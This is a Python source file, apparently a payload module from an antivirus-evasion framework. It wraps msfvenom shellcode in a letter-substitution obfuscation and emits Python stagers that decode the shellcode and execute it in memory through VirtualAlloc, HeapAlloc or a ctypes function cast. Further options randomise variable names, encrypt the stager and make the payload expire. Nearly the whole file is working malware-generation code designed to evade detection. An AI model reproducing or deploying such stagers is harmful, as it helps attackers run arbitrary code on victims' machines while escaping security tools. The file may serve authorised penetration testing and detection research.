"""

Currently, this code takes normal shellcode, and replaces the a hex character with a random non hex letter.  At runtime,
the executables reverses the letter substitution and executes the shellcode


Letter substitution code was adapted from:
http://www.tutorialspoint.com/python/string_maketrans.htm


module by @christruncer
contributed to by @EdvardHolst

"""


import string, random
from datetime import date
from datetime import timedelta

from modules.common import shellcode
from modules.common import helpers
from modules.common import encryption


class Payload:

    def __init__(self):
        # required options
        self.description = "A letter used in shellcode is replaced with a different letter. At runtime, the exe reverses the letter substitution and executes the shellcode"
        self.language = "python"
        self.rating = "Excellent"
        self.extension = "py"

        self.shellcode = shellcode.Shellcode()

        # options we require user interaction for- format is {OPTION : [Value, Description]]}
        self.required_options = {
                                    "COMPILE_TO_EXE" : ["Y", "Compile to an executable"],
                                    "USE_PYHERION"   : ["N", "Use the pyherion encrypter"],
                                    "INJECT_METHOD"  : ["Virtual", "Virtual, Heap, or Void"],
                                    "EXPIRE_PAYLOAD" : ["X", "Optional: Payloads expire after \"Y\" days (\"X\" disables feature)"]
                                }

    def generate(self):
        #Random letter substition variables
        hex_letters = "abcdef"
        non_hex_letters = "ghijklmnopqrstuvwxyz"
        encode_with_this = random.choice(hex_letters)
        decode_with_this = random.choice(non_hex_letters)

        # Generate Shellcode Using msfvenom
        Shellcode = self.shellcode.generate(self.required_options)

        # Generate Random Variable Names
        subbed_shellcode_variable_name = helpers.randomString()
        shellcode_variable_name = helpers.randomString()
        rand_ptr = helpers.randomString()
        rand_buf = helpers.randomString()
        rand_ht = helpers.randomString()
        rand_decoded_letter = helpers.randomString()
        rand_correct_letter = helpers.randomString()
        rand_sub_scheme = helpers.randomString()

        # Create Letter Substitution Scheme
        sub_scheme = string.maketrans(encode_with_this, decode_with_this)

        # Escaping Shellcode
        Shellcode = Shellcode.encode("string_escape")

        if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
            if self.required_options["EXPIRE_PAYLOAD"][0].lower() == "x":

                # Create Payload File
                payload_code = 'import ctypes as avlol\n'
                payload_code += 'from string import maketrans\n'
                payload_code += rand_decoded_letter + ' = "%s"\n' % decode_with_this
                payload_code += rand_correct_letter + ' = "%s"\n' % encode_with_this
                payload_code += rand_sub_scheme + ' = maketrans('+ rand_decoded_letter +', '+ rand_correct_letter + ')\n'
                payload_code += subbed_shellcode_variable_name + ' = \"'+ Shellcode.translate(sub_scheme) +'\"\n'
                payload_code += subbed_shellcode_variable_name + ' = ' + subbed_shellcode_variable_name + '.translate(' + rand_sub_scheme + ')\n'
                payload_code += shellcode_variable_name + ' = bytearray(' + subbed_shellcode_variable_name + '.decode(\"string_escape\"))\n'
                payload_code += rand_ptr + ' = avlol.windll.kernel32.VirtualAlloc(avlol.c_int(0),avlol.c_int(len(' + shellcode_variable_name + ')),avlol.c_int(0x3000),avlol.c_int(0x40))\n'
                payload_code += rand_buf + ' = (avlol.c_char * len(' + shellcode_variable_name + ')).from_buffer(' + shellcode_variable_name + ')\n'
                payload_code += 'avlol.windll.kernel32.RtlMoveMemory(avlol.c_int(' + rand_ptr + '),' + rand_buf + ',avlol.c_int(len(' + shellcode_variable_name + ')))\n'
                payload_code += rand_ht + ' = avlol.windll.kernel32.CreateThread(avlol.c_int(0),avlol.c_int(0),avlol.c_int(' + rand_ptr + '),avlol.c_int(0),avlol.c_int(0),avlol.pointer(avlol.c_int(0)))\n'
                payload_code += 'avlol.windll.kernel32.WaitForSingleObject(avlol.c_int(' + rand_ht + '),avlol.c_int(-1))\n'

                if self.required_options["USE_PYHERION"][0].lower() == "y":
                    payload_code = encryption.pyherion(payload_code)

                return payload_code

            else:

                # Get our current date and add number of days to the date
                todaysdate = date.today()
                expiredate = str(todaysdate + timedelta(days=int(self.required_options["EXPIRE_PAYLOAD"][0])))

                # Extra Variables
                RandToday = helpers.randomString()
                RandExpire = helpers.randomString()

                # Create Payload File
                payload_code = 'import ctypes as avlol\n'
                payload_code += 'from string import maketrans\n'
                payload_code += 'from datetime import datetime\n'
                payload_code += 'from datetime import date\n\n'
                payload_code += RandToday + ' = datetime.now()\n'
                payload_code += RandExpire + ' = datetime.strptime(\"' + expiredate[2:] + '\",\"%y-%m-%d\") \n'
                payload_code += 'if ' + RandToday + ' < ' + RandExpire + ':\n'
                payload_code += '\t' + rand_decoded_letter + ' = "%s"\n' % decode_with_this
                payload_code += '\t' + rand_correct_letter + ' = "%s"\n' % encode_with_this
                payload_code += '\t' + rand_sub_scheme + ' = maketrans('+ rand_decoded_letter +', '+ rand_correct_letter + ')\n'
                payload_code += '\t' + subbed_shellcode_variable_name + ' = \"'+ Shellcode.translate(sub_scheme) +'\"\n'
                payload_code += '\t' + subbed_shellcode_variable_name + ' = ' + subbed_shellcode_variable_name + '.translate(' + rand_sub_scheme + ')\n'
                payload_code += '\t' + shellcode_variable_name + ' = bytearray(' + subbed_shellcode_variable_name + '.decode(\"string_escape\"))\n'
                payload_code += '\t' + rand_ptr + ' = avlol.windll.kernel32.VirtualAlloc(avlol.c_int(0),avlol.c_int(len(' + shellcode_variable_name + ')),avlol.c_int(0x3000),avlol.c_int(0x40))\n'
                payload_code += '\t' + rand_buf + ' = (avlol.c_char * len(' + shellcode_variable_name + ')).from_buffer(' + shellcode_variable_name + ')\n'
                payload_code += '\tavlol.windll.kernel32.RtlMoveMemory(avlol.c_int(' + rand_ptr + '),' + rand_buf + ',avlol.c_int(len(' + shellcode_variable_name + ')))\n'
                payload_code += '\t' + rand_ht + ' = avlol.windll.kernel32.CreateThread(avlol.c_int(0),avlol.c_int(0),avlol.c_int(' + rand_ptr + '),avlol.c_int(0),avlol.c_int(0),avlol.pointer(avlol.c_int(0)))\n'
                payload_code += '\tavlol.windll.kernel32.WaitForSingleObject(avlol.c_int(' + rand_ht + '),avlol.c_int(-1))\n'

                if self.required_options["USE_PYHERION"][0].lower() == "y":
                    payload_code = encryption.pyherion(payload_code)

                return payload_code

        if self.required_options["INJECT_METHOD"][0].lower() == "heap":
            if self.required_options["EXPIRE_PAYLOAD"][0].lower() == "x":

                HeapVar = helpers.randomString()

                # Create Payload File
                payload_code = 'import ctypes as avlol\n'
                payload_code += 'from string import maketrans\n'
                payload_code += rand_decoded_letter + ' = "%s"\n' % decode_with_this
                payload_code += rand_correct_letter + ' = "%s"\n' % encode_with_this
                payload_code += rand_sub_scheme + ' = maketrans('+ rand_decoded_letter +', '+ rand_correct_letter + ')\n'
                payload_code += subbed_shellcode_variable_name + ' = \"'+ Shellcode.translate(sub_scheme) +'\"\n'
                payload_code += subbed_shellcode_variable_name + ' = ' + subbed_shellcode_variable_name + '.translate(' + rand_sub_scheme + ')\n'
                payload_code += shellcode_variable_name + ' = bytearray(' + subbed_shellcode_variable_name + '.decode(\"string_escape\"))\n'
                payload_code += shellcode_variable_name + ' = bytearray(' + subbed_shellcode_variable_name + '.decode(\"string_escape\"))\n'
                payload_code += HeapVar + ' = avlol.windll.kernel32.HeapCreate(avlol.c_int(0x00040000),avlol.c_int(len(' + shellcode_variable_name + ') * 2),avlol.c_int(0))\n'
                payload_code += rand_ptr + ' = avlol.windll.kernel32.HeapAlloc(avlol.c_int(' + HeapVar + '),avlol.c_int(0x00000008),avlol.c_int(len( ' + shellcode_variable_name + ')))\n'
                payload_code += rand_buf + ' = (avlol.c_char * len(' + shellcode_variable_name + ')).from_buffer(' + shellcode_variable_name + ')\n'
                payload_code += 'avlol.windll.kernel32.RtlMoveMemory(avlol.c_int(' + rand_ptr + '),' + rand_buf + ',avlol.c_int(len(' + shellcode_variable_name + ')))\n'
                payload_code += rand_ht + ' = avlol.windll.kernel32.CreateThread(avlol.c_int(0),avlol.c_int(0),avlol.c_int(' + rand_ptr + '),avlol.c_int(0),avlol.c_int(0),avlol.pointer(avlol.c_int(0)))\n'
                payload_code += 'avlol.windll.kernel32.WaitForSingleObject(avlol.c_int(' + rand_ht + '),avlol.c_int(-1))\n'

                if self.required_options["USE_PYHERION"][0].lower() == "y":
                    payload_code = encryption.pyherion(payload_code)

                return payload_code

            else:

                # Get our current date and add number of days to the date
                todaysdate = date.today()
                expiredate = str(todaysdate + timedelta(days=int(self.required_options["EXPIRE_PAYLOAD"][0])))

                # Extra Variables
                RandToday = helpers.randomString()
                RandExpire = helpers.randomString()
                HeapVar = helpers.randomString()

                # Create Payload File
                payload_code = 'import ctypes as avlol\n'
                payload_code += 'from string import maketrans\n'
                payload_code += 'from datetime import datetime\n'
                payload_code += 'from datetime import date\n\n'
                payload_code += RandToday + ' = datetime.now()\n'
                payload_code += RandExpire + ' = datetime.strptime(\"' + expiredate[2:] + '\",\"%y-%m-%d\") \n'
                payload_code += 'if ' + RandToday + ' < ' + RandExpire + ':\n'
                payload_code += '\t' + rand_decoded_letter + ' = "%s"\n' % decode_with_this
                payload_code += '\t' + rand_correct_letter + ' = "%s"\n' % encode_with_this
                payload_code += '\t' + rand_sub_scheme + ' = maketrans('+ rand_decoded_letter +', '+ rand_correct_letter + ')\n'
                payload_code += '\t' + subbed_shellcode_variable_name + ' = \"'+ Shellcode.translate(sub_scheme) +'\"\n'
                payload_code += '\t' + subbed_shellcode_variable_name + ' = ' + subbed_shellcode_variable_name + '.translate(' + rand_sub_scheme + ')\n'
                payload_code += '\t' + shellcode_variable_name + ' = bytearray(' + subbed_shellcode_variable_name + '.decode(\"string_escape\"))\n'
                payload_code += '\t' + shellcode_variable_name + ' = bytearray(' + subbed_shellcode_variable_name + '.decode(\"string_escape\"))\n'
                payload_code += '\t' + HeapVar + ' = avlol.windll.kernel32.HeapCreate(avlol.c_int(0x00040000),avlol.c_int(len(' + shellcode_variable_name + ') * 2),avlol.c_int(0))\n'
                payload_code += '\t' + rand_ptr + ' = avlol.windll.kernel32.HeapAlloc(avlol.c_int(' + HeapVar + '),avlol.c_int(0x00000008),avlol.c_int(len( ' + shellcode_variable_name + ')))\n'
                payload_code += '\t' + rand_buf + ' = (avlol.c_char * len(' + shellcode_variable_name + ')).from_buffer(' + shellcode_variable_name + ')\n'
                payload_code += '\tavlol.windll.kernel32.RtlMoveMemory(avlol.c_int(' + rand_ptr + '),' + rand_buf + ',avlol.c_int(len(' + shellcode_variable_name + ')))\n'
                payload_code += '\t' + rand_ht + ' = avlol.windll.kernel32.CreateThread(avlol.c_int(0),avlol.c_int(0),avlol.c_int(' + rand_ptr + '),avlol.c_int(0),avlol.c_int(0),avlol.pointer(avlol.c_int(0)))\n'
                payload_code += '\tavlol.windll.kernel32.WaitForSingleObject(avlol.c_int(' + rand_ht + '),avlol.c_int(-1))\n'

                if self.required_options["USE_PYHERION"][0].lower() == "y":
                    payload_code = encryption.pyherion(payload_code)

                return payload_code

        else:
            if self.required_options["EXPIRE_PAYLOAD"][0].lower() == "x":

                #Additional random variable names
                rand_reverse_shell = helpers.randomString()
                rand_memory_shell = helpers.randomString()
                rand_shellcode = helpers.randomString()

                # Create Payload File
                payload_code = 'from ctypes import *\n'
                payload_code += 'from string import maketrans\n'
                payload_code += rand_decoded_letter + ' = "%s"\n' % decode_with_this
                payload_code += rand_correct_letter + ' = "%s"\n' % encode_with_this
                payload_code += rand_sub_scheme + ' = maketrans('+ rand_decoded_letter +', '+ rand_correct_letter + ')\n'
                payload_code += subbed_shellcode_variable_name + ' = \"'+ Shellcode.translate(sub_scheme) +'\"\n'
                payload_code += subbed_shellcode_variable_name + ' = ' + subbed_shellcode_variable_name + '.translate(' + rand_sub_scheme + ')\n'
                payload_code += subbed_shellcode_variable_name + ' = ' + subbed_shellcode_variable_name + '.decode(\"string_escape\")\n'
                payload_code += rand_memory_shell + ' = create_string_buffer(' + subbed_shellcode_variable_name + ', len(' + subbed_shellcode_variable_name + '))\n'
                payload_code += rand_shellcode + ' = cast(' + rand_memory_shell + ', CFUNCTYPE(c_void_p))\n'
                payload_code += rand_shellcode + '()'

                if self.required_options["USE_PYHERION"][0].lower() == "y":
                    payload_code = encryption.pyherion(payload_code)

                return payload_code

            else:

                # Get our current date and add number of days to the date
                todaysdate = date.today()
                expiredate = str(todaysdate + timedelta(days=int(self.required_options["EXPIRE_PAYLOAD"][0])))

                # Extra Variables
                RandToday = helpers.randomString()
                RandExpire = helpers.randomString()

                #Additional random variable names
                rand_reverse_shell = helpers.randomString()
                rand_memory_shell = helpers.randomString()
                rand_shellcode = helpers.randomString()

                # Create Payload File
                payload_code = 'from ctypes import *\n'
                payload_code += 'from string import maketrans\n'
                payload_code += 'from datetime import datetime\n'
                payload_code += 'from datetime import date\n\n'
                payload_code += RandToday + ' = datetime.now()\n'
                payload_code += RandExpire + ' = datetime.strptime(\"' + expiredate[2:] + '\",\"%y-%m-%d\") \n'
                payload_code += 'if ' + RandToday + ' < ' + RandExpire + ':\n'
                payload_code += '\t' + rand_decoded_letter + ' = "%s"\n' % decode_with_this
                payload_code += '\t' + rand_correct_letter + ' = "%s"\n' % encode_with_this
                payload_code += '\t' + rand_sub_scheme + ' = maketrans('+ rand_decoded_letter +', '+ rand_correct_letter + ')\n'
                payload_code += '\t' + subbed_shellcode_variable_name + ' = \"'+ Shellcode.translate(sub_scheme) +'\"\n'
                payload_code += '\t' + subbed_shellcode_variable_name + ' = ' + subbed_shellcode_variable_name + '.translate(' + rand_sub_scheme + ')\n'
                payload_code += '\t' + subbed_shellcode_variable_name + ' = ' + subbed_shellcode_variable_name + '.decode(\"string_escape\")\n'
                payload_code += '\t' + rand_memory_shell + ' = create_string_buffer(' + subbed_shellcode_variable_name + ', len(' + subbed_shellcode_variable_name + '))\n'
                payload_code += '\t' + rand_shellcode + ' = cast(' + rand_memory_shell + ', CFUNCTYPE(c_void_p))\n'
                payload_code += '\t' + rand_shellcode + '()'


                if self.required_options["USE_PYHERION"][0].lower() == "y":
                    payload_code = encryption.pyherion(payload_code)

                return payload_code

